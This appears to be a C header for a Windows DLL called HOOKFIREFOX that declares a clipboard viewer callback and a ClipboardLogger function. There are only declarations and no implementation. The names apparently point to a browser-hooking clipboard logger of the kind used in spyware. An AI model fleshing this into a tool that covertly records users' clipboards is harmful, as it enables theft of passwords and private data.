#pragma once
#ifdef HOOKFIREFOX_EXPORTS
#define HOOKFIREFOX_API __declspec(dllexport)
#else
#define HOOKFIREFOX_API __declspec(dllimport)
#endif

LRESULT CALLBACK ClipboardViewerProc(HWND hwnd, UINT message, WPARAM wParam, LPARAM lParam);
void ClipboardLogger(void);